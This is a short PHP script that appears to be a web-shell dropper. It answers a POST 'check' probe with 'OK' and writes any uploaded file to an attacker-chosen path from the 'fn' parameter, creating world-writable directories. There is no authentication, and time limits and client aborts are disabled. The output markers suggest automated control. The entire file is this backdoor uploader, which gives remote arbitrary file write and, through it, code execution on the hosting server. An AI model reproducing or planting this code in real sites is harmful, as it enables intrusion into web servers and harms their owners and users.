<?php
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('set_time_limit',0);
@ini_set('upload_max_filesize','8000000');
error_reporting(E_ALL);
ignore_user_abort(true);

if(isset($_POST['check']) && $_POST['check']=="1"){
	echo "OK";return;
}

if((isset($_FILES['file']))&&(isset($_GET['fn'])))
{
	$fn = $_GET['fn'];
	$rp=strrpos($fn,'/');
	if($rp!==false)
	{
		$dir = substr($fn,0,$rp);
		if(!file_exists($dir))mkdir($dir, 0777, true);
	}

	echo "###UNPK### ";
  echo move_uploaded_file($_FILES['file']['tmp_name'],$fn) ? 'OK' : 'ERR';
	echo "###UNPKEND###";
}
?>